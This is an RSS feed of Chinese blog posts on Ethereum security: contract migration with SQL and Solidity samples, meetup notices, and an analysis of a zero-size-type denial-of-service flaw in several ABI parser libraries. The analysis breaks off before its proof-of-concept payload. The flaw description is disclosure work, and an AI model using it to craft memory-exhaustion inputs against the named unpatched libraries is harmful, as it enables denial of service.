<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>以太坊 on 办公AI智能小助手</title>
        <link>http://localhost:1313/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/</link>
        <description>Recent content in 以太坊 on 办公AI智能小助手</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>qife</copyright>
        <lastBuildDate>Sat, 09 Aug 2025 18:07:54 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>智能合约迁移机制详解：从数据回写到成本分析</title>
        <link>http://localhost:1313/p/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E8%BF%81%E7%A7%BB%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3%E4%BB%8E%E6%95%B0%E6%8D%AE%E5%9B%9E%E5%86%99%E5%88%B0%E6%88%90%E6%9C%AC%E5%88%86%E6%9E%90/</link>
        <pubDate>Sat, 09 Aug 2025 18:07:54 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E8%BF%81%E7%A7%BB%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3%E4%BB%8E%E6%95%B0%E6%8D%AE%E5%9B%9E%E5%86%99%E5%88%B0%E6%88%90%E6%9C%AC%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;智能合约迁移机制详解&#34;&gt;智能合约迁移机制详解
&lt;/h1&gt;&lt;h2 id=&#34;为何需要合约迁移能力&#34;&gt;为何需要合约迁移能力
&lt;/h2&gt;&lt;p&gt;即使无漏洞的合约也可能因私钥被盗而被劫持。Bancor和KICKICO攻击事件证明，攻击者可入侵智能合约钱包。此时即便合约具备升级机制，也可能无法修复。必须部署新合约实例并正确初始化才能恢复功能。&lt;/p&gt;
&lt;p&gt;所有智能合约开发者都应在设计阶段集成迁移流程，企业也需做好应急准备。迁移包含两个关键步骤：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;恢复待迁移数据&lt;/li&gt;
&lt;li&gt;将数据写入新合约&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;迁移实施步骤&#34;&gt;迁移实施步骤
&lt;/h2&gt;&lt;h3 id=&#34;第一步数据恢复&#34;&gt;第一步：数据恢复
&lt;/h3&gt;&lt;p&gt;需从区块链特定区块读取数据。建议在事件发生前的区块获取数据，或过滤攻击者操作记录。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;数据恢复策略：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;公开变量&lt;/strong&gt;：通过getter直接获取uint/address等简单类型值&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;私有变量&lt;/strong&gt;：通过事件日志或计算内存偏移后调用getStorageAt&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;数组&lt;/strong&gt;：已知元素数量，可采用相同技术&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;映射&lt;/strong&gt;：需主动追踪键值，建议在存储时触发事件&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ERC20代币&lt;/strong&gt;：通过Transfer事件追踪持有地址，可使用Google BigTable以太坊存档或自行扫描&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;from_address&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bigquery&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ethereum_blockchain&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;token_transfers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;token_address&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x41424344&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;UNION&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;DISTINCT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;to_address&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bigquery&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ethereum_blockchain&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;token_transfers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;token_address&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x41424344&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;第二步数据写入&#34;&gt;第二步：数据写入
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;简单变量&lt;/strong&gt;：通过构造函数设置&lt;br&gt;
&lt;strong&gt;大数据量&lt;/strong&gt;：需分多笔交易处理（受GasLimit限制）&lt;/p&gt;
&lt;p&gt;建议为合约添加初始化状态，仅允许所有者修改变量。ERC20代币迁移示例流程：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;部署处于初始化状态的合约&lt;/li&gt;
&lt;li&gt;分批迁移余额（示例代码见下方）&lt;/li&gt;
&lt;li&gt;切换合约至生产状态&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-solidity&#34; data-lang=&#34;solidity&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;batchTransfer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;address&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;destinations&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;uint256&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;values&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;duringInitialization&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;onlyOwner&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;external&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;destinations&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;length&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;values&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;uint&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;balances&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;destinations&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;values&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;emit&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Transfer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;destinations&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;values&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;迁移核心考量&#34;&gt;迁移核心考量
&lt;/h2&gt;&lt;h3 id=&#34;成本分析&#34;&gt;成本分析
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;数据恢复：链下免费（可使用ethereum-etl或Google BigQuery）&lt;/li&gt;
&lt;li&gt;链上写入：200个账户迁移约消耗240万gas（当前约$5.04）&lt;/li&gt;
&lt;li&gt;主流ERC20代币迁移成本估算：
&lt;ul&gt;
&lt;li&gt;BNB(30万 holders): $7,500&lt;/li&gt;
&lt;li&gt;OMG(66万 holders): $16,500&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;交易所协作&#34;&gt;交易所协作
&lt;/h3&gt;&lt;p&gt;需确保交易所配合完成：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;新合约上架&lt;/li&gt;
&lt;li&gt;旧合约停用
历史案例（Augur/Vechain/Tron）显示交易所普遍配合良好&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;迁移-vs-可升级合约&#34;&gt;迁移 vs 可升级合约
&lt;/h2&gt;&lt;p&gt;可升级合约存在六大缺陷：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;需要精通EVM/Solidity底层&lt;/li&gt;
&lt;li&gt;增加代码复杂性和安全风险&lt;/li&gt;
&lt;li&gt;密钥管理负担加重&lt;/li&gt;
&lt;li&gt;每笔交易gas成本上升&lt;/li&gt;
&lt;li&gt;降低开发者测试严谨性&lt;/li&gt;
&lt;li&gt;损害用户信任度&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;适用升级机制的场景&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;需要频繁更新&lt;/li&gt;
&lt;li&gt;必须固定合约地址&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;最佳实践建议&#34;&gt;最佳实践建议
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;部署前完成迁移方案设计&lt;/li&gt;
&lt;li&gt;使用事件日志辅助数据追踪&lt;/li&gt;
&lt;li&gt;即使采用可升级合约，仍需准备迁移预案&lt;/li&gt;
&lt;li&gt;与交易所提前建立沟通机制&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;智能合约的不可变性要求开发者彻底重构应用构建方式，需要更严谨的设计流程。如需迁移方案验证帮助，可联系我们的以太坊安全咨询服务。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>以太坊安全技术深度解析：智能合约漏洞挖掘与防御实践</title>
        <link>http://localhost:1313/p/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%AE%9E%E8%B7%B5/</link>
        <pubDate>Sat, 09 Aug 2025 13:12:41 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%AE%9E%E8%B7%B5/</guid>
        <description>&lt;h3 id=&#34;观看演讲视频回放&#34;&gt;观看演讲视频回放
&lt;/h3&gt;&lt;p&gt;2017年12月12日，超过150名参与者在我们举办的年度最终Empire Hacking聚会上学习了如何编写和攻防智能合约。感谢所有到场人员、优秀演讲者以及Datadog提供的场地支持。&lt;/p&gt;
&lt;h3 id=&#34;智能合约安全简史&#34;&gt;智能合约安全简史
&lt;/h3&gt;&lt;p&gt;Consensys Diligence的Jon Maurelian从安全视角系统回顾了以太坊的过去、现在与未来：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;以太坊被设计为全球分布式共享计算机，Solidity等高级语言使智能合约开发成为可能&lt;/li&gt;
&lt;li&gt;这种开放执行环境存在委托调用、重入攻击等固有安全问题，已导致多起重大链上盗窃事件&lt;/li&gt;
&lt;li&gt;未来发展方向包括Viper安全语言、zk-SNARKs链上隐私方案，以及Manticore、KEVM等安全工具&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;智能合约ctf实战指南&#34;&gt;智能合约CTF实战指南
&lt;/h3&gt;&lt;p&gt;Trail of Bits的Sophia D&amp;rsquo;Antoine解析了包含Solidity挑战的CTF竞赛：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;参考CSAW 2017脚本可搭建以太坊CTF环境&lt;/li&gt;
&lt;li&gt;需掌握Manticore、Ethersplay等工具进行漏洞挖掘&lt;/li&gt;
&lt;li&gt;整数溢出和重入攻击是CTF常见题型，需研究历史赛题Write-up&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;区块链自动化漏洞挖掘&#34;&gt;区块链自动化漏洞挖掘
&lt;/h3&gt;&lt;p&gt;Trail of Bits的Mark Mossberg演示了Manticore对EVM字节码的符号执行：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;符号执行技术可实现高代码覆盖率，用于构建自动化漏洞发现系统&lt;/li&gt;
&lt;li&gt;在以太坊场景中可自动识别合约函数、生成触发异常状态的交易&lt;/li&gt;
&lt;li&gt;开源工具Manticore通过符号执行分析EVM智能合约&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;区块链解决信息安全需求&#34;&gt;区块链解决信息安全需求
&lt;/h3&gt;&lt;p&gt;Paul Makowski介绍了网络安全代币PolySwarm的创新设计：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当前威胁情报市场存在检测能力重叠、覆盖不足等问题&lt;/li&gt;
&lt;li&gt;以太坊智能合约通过程序化市场设计重构激励体系&lt;/li&gt;
&lt;li&gt;PolySwarm通过降低参与门槛激活安全专家资源，构建集体防御网络&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;联系我们&#34;&gt;联系我们
&lt;/h3&gt;&lt;p&gt;我们已成为行业领先的智能合约审计服务商，保障过代币发行、DApp及区块链平台的安全。如需帮助请联系我们。&lt;/p&gt;
&lt;p&gt;（原文包含的社交媒体分享链接及页脚信息已省略）&lt;/p&gt;
</description>
        </item>
        <item>
        <title>在Empire Hacking上探讨以太坊安全 - 来自Trail of Bits的见解</title>
        <link>http://localhost:1313/p/%E5%9C%A8empire-hacking%E4%B8%8A%E6%8E%A2%E8%AE%A8%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%AE%89%E5%85%A8-%E6%9D%A5%E8%87%AAtrail-of-bits%E7%9A%84%E8%A7%81%E8%A7%A3/</link>
        <pubDate>Thu, 07 Aug 2025 22:19:05 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%9C%A8empire-hacking%E4%B8%8A%E6%8E%A2%E8%AE%A8%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%AE%89%E5%85%A8-%E6%9D%A5%E8%87%AAtrail-of-bits%E7%9A%84%E8%A7%81%E8%A7%A3/</guid>
        <description>&lt;h1 id=&#34;在empire-hacking上探讨以太坊安全&#34;&gt;在Empire Hacking上探讨以太坊安全
&lt;/h1&gt;&lt;p&gt;如果你正在使用区块链技术构建实际应用并关注安全问题，这个聚会不容错过。12月12日，我们将举办一期完全专注于以太坊安全的Empire Hacking特别活动。&lt;/p&gt;
&lt;h2 id=&#34;为什么要参加&#34;&gt;为什么要参加？
&lt;/h2&gt;&lt;p&gt;四位区块链安全专家将分享如何编写安全的智能合约，以及如何攻击它们。其中两位演讲者来自我们的团队。&lt;/p&gt;
&lt;p&gt;我们已成为行业最受信任的审计服务、工具和最佳实践提供商之一，涉及智能合约及其相关技术的安全防护。我们成功保障了代币发行、去中心化应用乃至整个区块链平台的安全。与往届Empire Hacking活动一样，我们期待与开发社区分享前沿技术。&lt;/p&gt;
&lt;h2 id=&#34;演讲嘉宾阵容&#34;&gt;演讲嘉宾阵容
&lt;/h2&gt;&lt;p&gt;Trail of Bits的Sophia D&amp;rsquo;Antoine将讨论近期CTF比赛中Solidity和以太坊面临的挑战，以及利用这些漏洞所需的工具。&lt;/p&gt;
&lt;p&gt;Consensys Diligence的John Maurelian将分享他在Devcon3上了解到的以太坊安全最新进展。&lt;/p&gt;
&lt;p&gt;Mark Mossberg将展示Trail of Bits如何通过符号执行引擎Manticore发现EVM字节码中的漏洞。&lt;/p&gt;
&lt;p&gt;Paul Makowski将介绍他即将推出的安全导向型以太坊代币PolySwarm，该项目利用区块链技术解决威胁情报行业的缺陷。&lt;/p&gt;
&lt;p&gt;企业以太坊联盟的Amber Baldet和Brian Schroeder将探讨Quorum区块链中应用的威胁建模、机密交易和零知识证明技术。&lt;/p&gt;
&lt;h2 id=&#34;活动时间与地点&#34;&gt;活动时间与地点
&lt;/h2&gt;&lt;p&gt;活动将于12月12日下午6点举行，地点在纽约时报大厦的DataDog办公室。需提前报名。照例将提供轻食和啤酒。&lt;/p&gt;
&lt;p&gt;了解更多Empire Hacking信息：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;访问官网&lt;/li&gt;
&lt;li&gt;Meetup报名&lt;/li&gt;
&lt;li&gt;加入Slack社区&lt;/li&gt;
&lt;li&gt;关注Twitter账号@EmpireHacking&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>亿次空耗：以太坊ABI解析器中的零大小类型DoS漏洞分析</title>
        <link>http://localhost:1313/p/%E4%BA%BF%E6%AC%A1%E7%A9%BA%E8%80%97%E4%BB%A5%E5%A4%AA%E5%9D%8Aabi%E8%A7%A3%E6%9E%90%E5%99%A8%E4%B8%AD%E7%9A%84%E9%9B%B6%E5%A4%A7%E5%B0%8F%E7%B1%BB%E5%9E%8Bdos%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
        <pubDate>Sat, 02 Aug 2025 09:56:18 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BA%BF%E6%AC%A1%E7%A9%BA%E8%80%97%E4%BB%A5%E5%A4%AA%E5%9D%8Aabi%E8%A7%A3%E6%9E%90%E5%99%A8%E4%B8%AD%E7%9A%84%E9%9B%B6%E5%A4%A7%E5%B0%8F%E7%B1%BB%E5%9E%8Bdos%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;亿次空耗---the-trail-of-bits博客&#34;&gt;亿次空耗 - The Trail of Bits博客
&lt;/h1&gt;&lt;p&gt;在以太坊强大的区块链技术背后，隐藏着一个开发者们较少提及的挑战：编写健壮的以太坊ABI（应用二进制接口）解析器的复杂性。以太坊ABI对区块链基础设施至关重要，它实现了智能合约与外部应用间的无缝交互。数据类型的复杂性和编解码的精确需求使得ABI解析充满挑战。规范或实现中的模糊性可能导致危及用户的漏洞。&lt;/p&gt;
&lt;p&gt;本文将深入剖析一个新型漏洞，该漏洞针对这些解析器，令人联想到曾肆虐XML领域的&amp;quot;十亿大笑&amp;quot;攻击。我们发现以太坊ABI规范部分条款表述松散，导致多个实现存在可利用漏洞，包括eth_abi(Python)、ethabi(Rust)、alloy-rs和ethereumjs-abi等库，可能引发拒绝服务(DoS)攻击。截至发文时，仅Python库已完成修复。&lt;/p&gt;
&lt;h2 id=&#34;什么是以太坊abi&#34;&gt;什么是以太坊ABI？
&lt;/h2&gt;&lt;p&gt;当链上合约交互或链下组件与合约通信时，以太坊使用ABI编码来处理请求和响应。这种编码方式不自我描述，编解码器需要提供定义数据类型的模式。与C语言中平台相关的ABI不同，以太坊规范了应用间二进制数据的传递方式。虽然规范尚未正式化，但清晰展现了数据交换机制。&lt;/p&gt;
&lt;p&gt;当前规范存在于Solidity文档中，其类型定义影响了Solidity和Vyper等智能合约语言。&lt;/p&gt;
&lt;h2 id=&#34;漏洞原理&#34;&gt;漏洞原理
&lt;/h2&gt;&lt;p&gt;零大小类型(ZST)指在磁盘存储中占零（或极小）字节，但加载到内存后需要显著更多空间的数据类型。以太坊ABI允许ZST存在，攻击者可利用其特性，通过极小量的磁盘或网络数据诱发巨大的内存分配。&lt;/p&gt;
&lt;p&gt;考虑以下场景：当解析器遇到ZST数组时会发生什么？它会尝试解析数组声明包含的所有ZST元素。由于每个元素占零字节，定义超大型ZST数组轻而易举。&lt;/p&gt;
&lt;p&gt;示例显示：20字节的磁盘数据可反序列化为包含数字2、1、3的数组；而仅8字节的数据却能反序列化为2³²个ZST元素（如空元组或空数组）。如果每个ZST在解析后仍占零字节内存，这不成问题。但实践中，每个元素通常需要少量非零内存，导致整体数组需要巨大内存分配，形成DoS攻击。&lt;/p&gt;
&lt;h2 id=&#34;概念验证&#34;&gt;概念验证
&lt;/h2&gt;&lt;p&gt;我们通过以下十六进制数据载荷演示多个库中的漏洞：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
